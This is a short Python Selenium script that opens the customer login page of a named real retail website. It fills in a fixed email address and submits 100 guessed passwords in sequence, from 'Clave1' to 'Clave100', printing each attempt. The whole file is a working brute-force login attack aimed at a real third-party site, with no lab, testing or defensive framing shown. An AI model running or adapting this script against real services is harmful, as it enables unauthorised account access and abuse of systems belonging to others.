import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome()
driver.get("https://www.everlast.cl/customer/account/login/")
time.sleep(5)

for i in range(1,101):
    time.sleep(2)
    email = driver.find_element_by_id("email")
    email.clear()
    email.send_keys("pruebacriptoy@outlook.com")
    password = driver.find_element_by_id("pass")
    password.clear()
    clave = "Clave" + str(i)
    password.send_keys(clave)
    print("Intento " + str(i) + ": " + clave)
    click = driver.find_element_by_id("send2").click()

